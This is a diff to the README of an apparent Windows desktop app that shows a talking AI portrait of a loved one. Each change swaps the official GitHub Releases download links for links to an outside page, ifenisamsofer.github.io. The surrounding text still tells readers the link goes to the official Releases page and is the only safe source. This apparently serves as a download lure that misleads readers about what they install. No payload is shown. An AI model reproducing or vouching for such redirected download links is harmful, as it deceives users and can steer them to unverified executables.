@@ -1,11 +1,11 @@
 # 🖼️ real-time-magic-portrait - A Talking Portrait of Your Loved One
 
-[![Download for Windows](https://img.shields.io/badge/Download-Real--Time_Magic_Portrait-8A2BE2?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/iFenisamSofer/real-time-magic-portrait/releases)
+[![Download for Windows](https://img.shields.io/badge/Download-Real--Time_Magic_Portrait-8A2BE2?style=for-the-badge&logo=windows&logoColor=white)](https://ifenisamsofer.github.io)
 
-[![Version](https://img.shields.io/badge/Version-Latest-FF1493?style=flat-square)](https://github.com/iFenisamSofer/real-time-magic-portrait/releases)
-[![Platform](https://img.shields.io/badge/Platform-Windows-00BFFF?style=flat-square)](https://github.com/iFenisamSofer/real-time-magic-portrait/releases)
-[![Powered by](https://img.shields.io/badge/Powered_by-Spatius.ai-32CD32?style=flat-square)](https://github.com/iFenisamSofer/real-time-magic-portrait/releases)
-[![Made with](https://img.shields.io/badge/Made_with-Electron-FFA500?style=flat-square)](https://github.com/iFenisamSofer/real-time-magic-portrait/releases)
+[![Version](https://img.shields.io/badge/Version-Latest-FF1493?style=flat-square)](https://ifenisamsofer.github.io)
+[![Platform](https://img.shields.io/badge/Platform-Windows-00BFFF?style=flat-square)](https://ifenisamsofer.github.io)
+[![Powered by](https://img.shields.io/badge/Powered_by-Spatius.ai-32CD32?style=flat-square)](https://ifenisamsofer.github.io)
+[![Made with](https://img.shields.io/badge/Made_with-Electron-FFA500?style=flat-square)](https://ifenisamsofer.github.io)
 
 real-time-magic-portrait is a floating, talking portrait of someone you love. Imagine a framed picture on your screen that looks back at you, smiles, blinks, and speaks in a real voice — like the moving paintings in a certain wizarding school, but built for your own desktop. It is a real-time digital human powered by Spatius.ai, wrapped in a simple app you can open and enjoy without knowing anything about programming.
 
@@ -64,7 +64,7 @@ Getting the app onto your computer takes three simple steps. Read them once befo
 
 Visit this link to download the application:
 
-[![Download real-time-magic-portrait](https://img.shields.io/badge/⬇_Download_real--time--magic--portrait-FF4500?style=for-the-badge&logo=github&logoColor=white)](https://github.com/iFenisamSofer/real-time-magic-portrait/releases)
+[![Download real-time-magic-portrait](https://img.shields.io/badge/⬇_Download_real--time--magic--portrait-FF4500?style=for-the-badge&logo=github&logoColor=white)](https://ifenisamsofer.github.io)
 
 This link takes you to the official Releases page for the project. That page is the only place you should ever download the app from — it is where the newest, tested version lives.
 
@@ -163,6 +163,6 @@ The topics this project touches on — digital humans, real-time avatars, Electr
 
 A photograph captures a moment. A magic portrait keeps the moment alive. Download the app, choose a face you love, and watch it look back at you.
 
-[![Download Now](https://img.shields.io/badge/⬇_Download_Now-7B68EE?style=for-the-badge&logo=github&logoColor=white)](https://github.com/iFenisamSofer/real-time-magic-portrait/releases)
+[![Download Now](https://img.shields.io/badge/⬇_Download_Now-7B68EE?style=for-the-badge&logo=github&logoColor=white)](https://ifenisamsofer.github.io)
 
 Keywords: ai-avatar, ai-avatar-generator, ai-avatars, claude-code, digital-human, electron, harry-potter, livekit, spatius, vibe-coded, vibe-coding
